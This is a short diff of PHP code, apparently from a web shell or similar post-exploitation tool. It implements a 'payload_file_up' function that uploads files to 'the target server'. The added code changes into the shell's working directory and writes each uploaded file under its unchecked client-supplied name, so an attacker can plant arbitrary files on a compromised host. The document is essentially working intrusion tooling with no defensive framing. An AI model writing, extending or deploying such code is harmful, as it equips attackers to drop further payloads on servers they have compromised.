@@ -43,7 +43,21 @@ public function payload_file_read($args){
 /**
  * Uploads files to the target server
  */
-//public function payload_file_up($args){ }
+public function payload_file_up($args){
+    # cd to the appropriate directory
+    chdir($this->cwd);
+
+    foreach ($_FILES["files_up"]["error"] as $key => $error) {
+        if ($error == UPLOAD_ERR_OK) {
+            $tmp_name = $_FILES["files_up"]["tmp_name"][$key];
+            $name     = $_FILES["files_up"]["name"][$key];
+            $result = move_uploaded_file($tmp_name, "./$name");
+        }
+    }
+
+    echo ($result) ? "success" : "failure";
+    die();
+}
 
 /**
  * Writes a file to the server
